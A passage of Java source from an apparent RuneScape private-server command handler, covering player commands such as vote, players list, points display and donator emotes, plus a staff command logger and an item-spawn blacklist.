                       // "http://rage-scape.com/forums/index.php?/topic/3288-black-screen-detailed-guide-pictures/");
                return true;
                
            case "vote":
                player.getPackets().sendOpenURL(
                        "http://noszscape.org/vote/");
                return true;
   /*         case "check":
				                case "reward": {
                try {
                    VoteReward reward = Player.voteChecker.getReward(player.getUsername().replaceAll(" ", "_"));
                    if (reward != null) {
                        switch (reward.getReward()) {
                            case 0:
                                player.getInventory().addItemMoneyPouch(995, 150000);
                                break;
                            case 1:
                                player.getInventory().addItem(4278, 10000);
                                //sencond reward
                                break;
                            case 2:
                                player.getInventory().addItem(24154, 5);
                                break;
                            //ect...
                            case 3:
                            	player.getInventory().addItem(29977, 100);
                            	break;

                            default:
                                player.getPackets().sendGameMessage("Reward not found.");
                                break;
                        }
                        player.voteCount++;
                        player.getPackets().sendGameMessage("Thank you for voting.");
                    } else {
                        player.getPackets().sendGameMessage("You have no items waiting for you.");
                    }
                } catch (Exception e) {
                    player.getPackets().sendGameMessage("An error occurred please try again later.");
                }
            }
            return true;*/
            
            
				    			case "players3":
				    				player.getPackets().sendGameMessage("There are currently <col=FF0000><shad=000000>" + World.getPlayers().size()+ "</shad></col> players online.");
				    				player.getPackets().sendIComponentText(1166, 23, "<col=FFFFFF><shad=000000>Players List</shad></col>");
				    				player.getPackets().sendIComponentText(1166, 2, World.getPlayers().size() == 1 ? "There are currently <col=FF0000><shad=000000>" + World.getPlayers().size()+ "</shad></col> player online." : "There are currently <col=FF0000><shad=000000>" + World.getPlayers().size()+ "</shad></col> players online.");
				    				String list = "";
				    				//
				    				player.getPackets().sendIComponentText(1166, 1, list);
				    				player.setNextForceTalk(new ForceTalk("There are currently " + World.getPlayers().size()
				    						+ " players playing " + Settings.SERVER_NAME
				    						+ "."));	
				    				player.getInterfaceManager().sendInterface(1166);
				    				return true;            

				                case "myinfo":
				    				player.getPackets().sendGameMessage("Prestige: <col=00688B>" + player.prestigeTokens + "</col>");
				    				player.getPackets().sendGameMessage("Loyalty points: <col=00688B>" + player.getLoyaltyPoints() + "</col>");
				    				player.getPackets().sendGameMessage("Trivia points: <col=00688B>" + player.getTriviaPoints() + "</col>");
				    				player.getPackets().sendGameMessage("Dung. tokens: <col=00688B>" + player.getDungTokens() + "</col>");
				    				player.getInterfaceManager().sendInterface(410); //THE INTERFACE IT OPENS
				    				player.getPackets().sendIComponentText(410, 9, "~My points~"); //Title
				    				player.getPackets().sendIComponentText(410, 5, "Prestige: " + player.prestigeTokens + ""); 
				    				player.getPackets().sendIComponentText(410, 6, "Loyalty Points: " + player.getLoyaltyPoints() + ""); 
				    				player.getPackets().sendIComponentText(410, 7, "Trivia Points: " + player.getTriviaPoints() + ""); 
				    				player.getPackets().sendIComponentText(410, 8, "Dungeoneering Tokens: " + player.getDungTokens() + ""); 
				    		       
				    				return true;
            
			case "checkdonation":
				Donations.checkDonation(player);
				return true; 

			case "testhomescene":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return true;
				}
				player.getCutscenesManager().play(new HomeCutScene());
				return true; 

			/*case "crystal":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("No.");
				return false;
				}
			player.getInventory().addItem(6099, 1);
			player.sm("You now have your new Teleport Crystal.");
			return true;
			*/
			case "fly":
				if (player.isAngelicDonator()) {
				player.setNextAnimation(new Animation(1914));
				player.setNextGraphics(new Graphics(92));
				player.getAppearence().setRenderEmote(1666);
				} else {
				player.sm("You must be an Angelic Donator to use this command.");
				}
				return true;
				
			case "unlend":
				LendingManager.process();
				return true;
				
			case "land":
				player.getAppearence().setRenderEmote(-1);
				return true;
			case "switchlooks":
				player.switchItemsLook();
				player.getPackets().sendGameMessage("You are now playing with " + (player.isOldItemsLook() ? "old" : "new") + " item looks.");
				return true; 

			}
		}
		return true;
	}

	public static void archiveLogs(Player player, String[] cmd) {
		try {
			if (player.getRights() < 1)
				return;
			String location = "";
			if (player.getRights() == 2) {
				location = Settings.LOG_PATH +
						"" +
						"" +
						"/" + player.getUsername() + ".txt";
			} else if (player.getRights() == 1) {
				location = Settings.LOG_PATH + "mod/" + player.getUsername() + ".txt";
			}
			String afterCMD = "";
			for (int i = 1; i < cmd.length; i++)
				afterCMD += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			BufferedWriter writer = new BufferedWriter(new FileWriter(location,
					true));
			writer.write("[" + currentTime("dd MMMMM yyyy 'at' hh:mm:ss z") + "] - ::"
					+ cmd[0] + " " + afterCMD);
			writer.newLine();
			writer.flush();
			writer.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static String currentTime(String dateFormat) {
		Calendar cal = Calendar.getInstance();
		SimpleDateFormat sdf = new SimpleDateFormat(dateFormat);
		return sdf.format(cal.getTime());
	}
	
	public static boolean cantSpawn(int itemId) {
		ItemDefinitions def = ItemDefinitions.getItemDefinitions(itemId);
		String name = def.getName().toLowerCase();
		if (name.contains("chaotic") || name.contains("offhand") || name.contains("off-hand") || name.contains("assassin") || name.contains("party") || name.contains("h'ween")
				 || name.contains("scythe") || name.contains("bunny") || name.contains("easter") || name.contains("dragonfire") || name.contains("godsword") || name.contains("hilt")
				 || name.contains("lucky") || name.contains("offhand") || name.contains("torva") || name.contains("pernix") || name.contains("virtus") || name.contains("dharoks")
				 || name.contains("ahrims") || name.contains("guthans") || name.contains("karils") || name.contains("torags") || name.contains("veracs") || name.contains("akrisae's")
				 || name.contains("bandos") || name.contains("armadyl") || name.contains("saradomin") || name.contains("zamorak") || name.contains("subjugation") || name.contains("spirit")
				 || name.contains("token") || name.contains("coin") || name.contains("offhand") || name.contains("bolt (e)") || name.contains("dart") || name.contains("arrow")
				 || name.contains("third") || name.contains("age") || name.contains("dragonbone") || name.contains("degraded") || name.contains("zuriel") || name.contains("vesta")
				 || name.contains("royal") || name.contains("morrigan") || name.contains("(deg)") || name.contains("statius") || name.contains("corrupt") || name.contains("c.")
				 || name.contains("korasi") || name.contains("cannon") || name.contains("light") || name.contains("infinity") || name.contains("gano") || name.contains("polypore") || name.contains("spirit")
				 || name.contains("vigour") || name.contains("goliath") || name.contains("dominion") || name.contains("death dart") || name.contains("lotus") || name.contains("tetsu") || name.contains("sea")
				 || name.contains("singer") || name.contains("polypore") || name.contains("vanguard") || name.contains("battle") || name.contains("trickster") || name.contains("quick")
				 || name.contains("primal") || name.contains("extreme") || name.contains("vine") || name.contains("firecape") || name.contains("fire cape") || name.contains("tokhaar") || name.contains("whip")
				 || name.contains("dark bow") || name.contains("perfect") || name.contains("drygore") || (name.contains("ban") && name.contains("hammer")) || (name.contains("dragon") && name.contains("claw")))
			return true;
		else
			return false;
	}

	/*
	 * doesnt let it be instanced
	 */
	private Commands() {

	}
}